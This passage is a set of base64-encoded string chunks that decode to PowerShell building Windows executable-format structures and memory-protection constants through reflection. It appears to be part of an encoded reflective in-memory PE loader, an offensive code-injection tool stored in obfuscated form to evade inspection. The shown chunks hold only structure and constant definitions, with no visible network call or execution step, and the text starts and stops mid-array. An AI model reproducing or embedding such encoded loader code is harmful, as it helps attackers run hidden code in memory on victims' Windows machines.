ZXIuRGVmaW5lRmllbGQoJ0Jhc2VSZWxvY2F0aW9uVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDEzNikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0RlYnVnJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgxNDQpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBcmNoaXRlY3R1cmUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE1MikgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0dsb2JhbFB0cicsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTYwKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVExTVGFibGUnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE2OCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0xvYWRDb25maWdUYWJsZScsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTc2KSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQm91bmRJbXBvcnQnLCAkSU1BR0VfREFUQV9ESVJFQ1RPUlksICdQdWJsaWMnKSkuU2V0T2Zmc2V0KDE4NCkgfCBPdXQtTnVsbAoJCSgkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0lBVCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMTkyKSB8IE91dC1OdWxsCgkJKCRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRGVsYXlJbXBvcnREZXNjcmlwdG9yJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMDApIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdDTFJSdW50aW1lSGVhZGVyJywgJElNQUdFX0RBVEFfRElSRUNUT1JZLCAnUHVibGljJykpLlNldE9mZnNldCgyMDgpIHwgT3V0LU51bGwKCQkoJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdSZXNlcnZlZCcsICRJTUFHRV9EQVRBX0RJUkVDVE9SWSwgJ1B1YmxpYycpKS5TZXRPZmZzZXQoMjE2KSB8IE91dC1OdWxsCgkJJElNQUdFX09QVElPTkFMX0hFQURFUjMyID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfT1BUSU9OQUxfSEVBREVSMzIgLVZhbHVlICRJTUFHRV9PUFRJT05BTF9IRUFERVIzMgoKCQkjU3RydWN0IElNQUdFX05UX0hFQURFUlM2NAoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlv",
		"dXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfTlRfSEVBREVSUzY0JywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMjY0KQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnU2lnbmF0dXJlJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdGaWxlSGVhZGVyJywgJElNQUdFX0ZJTEVfSEVBREVSLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnT3B0aW9uYWxIZWFkZXInLCAkSU1BR0VfT1BUSU9OQUxfSEVBREVSNjQsICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJElNQUdFX05UX0hFQURFUlM2NCA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIElNQUdFX05UX0hFQURFUlM2NCAtVmFsdWUgJElNQUdFX05UX0hFQURFUlM2NAoJCQoJCSNTdHJ1Y3QgSU1BR0VfTlRfSEVBREVSUzMyCgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9OVF9IRUFERVJTMzInLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyNDgpCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaWduYXR1cmUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpbGVIZWFkZXInLCAkSU1BR0VfRklMRV9IRUFERVIsICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdPcHRpb25hbEhlYWRlcicsICRJTUFHRV9PUFRJT05BTF9IRUFERVIzMiwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkSU1BR0VfTlRfSEVBREVSUzMyID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfTlRfSEVBREVSUzMyIC1WYWx1ZSAkSU1BR0VfTlRfSEVBREVSUzMyCgoJCSNTdHJ1Y3QgSU1BR0VfRE9TX0hFQURFUgoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfRE9TX0hFQURFUicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDY0KQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9tYWdpYycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jYmxwJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NwJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NybGMnLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfY3BhcmhkcicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9taW5hbGxvYycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9tYXhhbGxvYycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9zcycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9zcCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9jc3VtJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2lwJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2NzJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX2xmYXJsYycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9vdm5vJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgoJCSRlX3Jlc0ZpZWxkID0gJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdlX3JlcycsIFtVSW50MTZbXV0sICdQdWJsaWMsIEhhc0ZpZWxkTWFyc2hhbCcpCgkJJENvbnN0cnVjdG9yVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdOjpCeVZhbEFycmF5CgkJJEZpZWxkQXJyYXkgPSBAKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbEFzQXR0cmlidXRlXS5HZXRGaWVsZCgnU2l6ZUNvbnN0JykpCgkJJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCAkQ29uc3RydWN0b3JWYWx1ZSwgJEZpZWxkQXJyYXksIEAoW0ludDMyXSA0KSkKCQkkZV9yZXNGaWVsZC5TZXRDdXN0b21BdHRyaWJ1dGUoJEF0dHJpYkJ1aWxkZXIpCgoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9vZW1pZCcsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9vZW1pbmZvJywgW1VJbnQxNl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgoJCSRlX3JlczJGaWVsZCA9ICRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnZV9yZXMyJywgW1VJbnQxNltdXSwgJ1B1YmxpYywgSGFzRmllbGRNYXJzaGFsJykKCQkkQ29uc3RydWN0b3JWYWx1ZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuVW5tYW5hZ2VkVHlwZV06OkJ5VmFsQXJyYXkKCQkkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uRW1pdC5DdXN0b21BdHRyaWJ1dGVCdWlsZGVyKCRDb25zdHJ1Y3RvckluZm8sICRDb25zdHJ1Y3RvclZhbHVlLCAkRmllbGRBcnJheSwgQChbSW50MzJdIDEwKSkKCQkkZV9yZXMyRmllbGQuU2V0Q3VzdG9tQXR0cmlidXRlKCRBdHRyaWJCdWlsZGVyKQoKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ2VfbGZhbmV3JywgW0ludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkSU1BR0VfRE9TX0hFQURFUiA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkJCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9ET1NfSEVBREVSIC1WYWx1ZSAkSU1BR0VfRE9TX0hFQURFUgoKCQkjU3RydWN0IElNQUdFX1NFQ1RJT05fSEVBREVSCgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdJTUFHRV9TRUNUSU9OX0hFQURFUicsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDQwKQoKCQkkbmFtZUZpZWxkID0gJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdOYW1lJywgW0NoYXJbXV0sICdQdWJsaWMsIEhhc0ZpZWxkTWFyc2hhbCcpCgkJJENvbnN0cnVjdG9yVmFsdWUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdOjpCeVZhbEFycmF5CgkJJEF0dHJpYkJ1aWxkZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQ3VzdG9tQXR0cmlidXRlQnVpbGRlcigkQ29uc3RydWN0b3JJbmZvLCAkQ29uc3RydWN0b3JWYWx1ZSwgJEZpZWxkQXJyYXksIEAoW0ludDMyXSA4KSkKCQkkbmFtZUZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdWaXJ0dWFsU2l6ZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVmlydHVhbEFkZHJlc3MnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1NpemVPZlJhd0RhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb1Jhd0RhdGEnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1BvaW50ZXJUb1JlbG9jYXRpb25zJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdQb2ludGVyVG9MaW5lbnVtYmVycycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZSZWxvY2F0aW9ucycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZMaW5lbnVtYmVycycsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hhcmFjdGVyaXN0aWNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJElNQUdFX1NFQ1RJT05fSEVBREVSID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfU0VDVElPTl9IRUFERVIgLVZhbHVlICRJTUFHRV9TRUNUSU9OX0hFQURFUgoKCQkjU3RydWN0IElNQUdFX0JBU0VfUkVMT0NBVElPTgoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfQkFTRV9SRUxPQ0FUSU9OJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgOCkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ZpcnR1YWxBZGRyZXNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdTaXplT2ZCbG9jaycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRJTUFHRV9CQVNFX1JFTE9DQVRJT04gPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9CQVNFX1JFTE9DQVRJT04gLVZhbHVlICRJTUFHRV9CQVNFX1JFTE9DQVRJT04KCgkJI1N0cnVjdCBJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUgoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1InLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCAyMCkKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0NoYXJhY3RlcmlzdGljcycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnVGltZURhdGVTdGFtcCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnRm9yd2FyZGVyQ2hhaW4nLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ05hbWUnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0ZpcnN0VGh1bmsnLCBbVUludDMy",
		"XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkSU1BR0VfSU1QT1JUX0RFU0NSSVBUT1IgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBJTUFHRV9JTVBPUlRfREVTQ1JJUFRPUiAtVmFsdWUgJElNQUdFX0lNUE9SVF9ERVNDUklQVE9SCgoJCSNTdHJ1Y3QgSU1BR0VfRVhQT1JUX0RJUkVDVE9SWQoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnSU1BR0VfRVhQT1JUX0RJUkVDVE9SWScsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDQwKQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQ2hhcmFjdGVyaXN0aWNzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdUaW1lRGF0ZVN0YW1wJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdNYWpvclZlcnNpb24nLCBbVUludDE2XSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ01pbm9yVmVyc2lvbicsIFtVSW50MTZdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTmFtZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQmFzZScsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTnVtYmVyT2ZGdW5jdGlvbnMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ051bWJlck9mTmFtZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZkZ1bmN0aW9ucycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnQWRkcmVzc09mTmFtZXMnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ0FkZHJlc3NPZk5hbWVPcmRpbmFscycsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRJTUFHRV9FWFBPUlRfRElSRUNUT1JZID0gJFR5cGVCdWlsZGVyLkNyZWF0ZVR5cGUoKQoJCSRXaW4zMlR5cGVzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfRVhQT1JUX0RJUkVDVE9SWSAtVmFsdWUgJElNQUdFX0VYUE9SVF9ESVJFQ1RPUlkKCQkKCQkjU3RydWN0IExVSUQKCQkkQXR0cmlidXRlcyA9ICdBdXRvTGF5b3V0LCBBbnNpQ2xhc3MsIENsYXNzLCBQdWJsaWMsIFNlcXVlbnRpYWxMYXlvdXQsIFNlYWxlZCwgQmVmb3JlRmllbGRJbml0JwoJCSRUeXBlQnVpbGRlciA9ICRNb2R1bGVCdWlsZGVyLkRlZmluZVR5cGUoJ0xVSUQnLCAkQXR0cmlidXRlcywgW1N5c3RlbS5WYWx1ZVR5cGVdLCA4KQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnTG93UGFydCcsIFtVSW50MzJdLCAnUHVibGljJykgfCBPdXQtTnVsbAoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnSGlnaFBhcnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkTFVJRCA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIExVSUQgLVZhbHVlICRMVUlECgkJCgkJI1N0cnVjdCBMVUlEX0FORF9BVFRSSUJVVEVTCgkJJEF0dHJpYnV0ZXMgPSAnQXV0b0xheW91dCwgQW5zaUNsYXNzLCBDbGFzcywgUHVibGljLCBTZXF1ZW50aWFsTGF5b3V0LCBTZWFsZWQsIEJlZm9yZUZpZWxkSW5pdCcKCQkkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdMVUlEX0FORF9BVFRSSUJVVEVTJywgJEF0dHJpYnV0ZXMsIFtTeXN0ZW0uVmFsdWVUeXBlXSwgMTIpCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdMdWlkJywgJExVSUQsICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJFR5cGVCdWlsZGVyLkRlZmluZUZpZWxkKCdBdHRyaWJ1dGVzJywgW1VJbnQzMl0sICdQdWJsaWMnKSB8IE91dC1OdWxsCgkJJExVSURfQU5EX0FUVFJJQlVURVMgPSAkVHlwZUJ1aWxkZXIuQ3JlYXRlVHlwZSgpCgkJJFdpbjMyVHlwZXMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBMVUlEX0FORF9BVFRSSUJVVEVTIC1WYWx1ZSAkTFVJRF9BTkRfQVRUUklCVVRFUwoJCQoJCSNTdHJ1Y3QgVE9LRU5fUFJJVklMRUdFUwoJCSRBdHRyaWJ1dGVzID0gJ0F1dG9MYXlvdXQsIEFuc2lDbGFzcywgQ2xhc3MsIFB1YmxpYywgU2VxdWVudGlhbExheW91dCwgU2VhbGVkLCBCZWZvcmVGaWVsZEluaXQnCgkJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lVHlwZSgnVE9LRU5fUFJJVklMRUdFUycsICRBdHRyaWJ1dGVzLCBbU3lzdGVtLlZhbHVlVHlwZV0sIDE2KQoJCSRUeXBlQnVpbGRlci5EZWZpbmVGaWVsZCgnUHJpdmlsZWdlQ291bnQnLCBbVUludDMyXSwgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVHlwZUJ1aWxkZXIuRGVmaW5lRmllbGQoJ1ByaXZpbGVnZXMnLCAkTFVJRF9BTkRfQVRUUklCVVRFUywgJ1B1YmxpYycpIHwgT3V0LU51bGwKCQkkVE9LRU5fUFJJVklMRUdFUyA9ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCQkkV2luMzJUeXBlcyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFRPS0VOX1BSSVZJTEVHRVMgLVZhbHVlICRUT0tFTl9QUklWSUxFR0VTCgoJCXJldHVybiAkV2luMzJUeXBlcwoJfQoKCUZ1bmN0aW9uIEdldC1XaW4zMkNvbnN0YW50cwoJewoJCSRXaW4zMkNvbnN0YW50cyA9IE5ldy1PYmplY3QgU3lzdGVtLk9iamVjdAoJCQoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIE1FTV9DT01NSVQgLVZhbHVlIDB4MDAwMDEwMDAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBNRU1fUkVTRVJWRSAtVmFsdWUgMHgwMDAwMjAwMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfTk9BQ0NFU1MgLVZhbHVlIDB4MDEKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX1JFQURPTkxZIC1WYWx1ZSAweDAyCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9SRUFEV1JJVEUgLVZhbHVlIDB4MDQKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX1dSSVRFQ09QWSAtVmFsdWUgMHgwOAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURSAtVmFsdWUgMHgxMAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9SRUFEIC1WYWx1ZSAweDIwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgUEFHRV9FWEVDVVRFX1JFQURXUklURSAtVmFsdWUgMHg0MAoJCSRXaW4zMkNvbnN0YW50cyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFBBR0VfRVhFQ1VURV9XUklURUNPUFkgLVZhbHVlIDB4ODAKCQkkV2luMzJDb25zdGFudHMgfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBQQUdFX05PQ0FDSEUgLVZhbHVlIDB4MjAwCgkJJFdpbjMyQ29uc3RhbnRzIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgSU1BR0VfUkVMX0JBU0VEX0FCU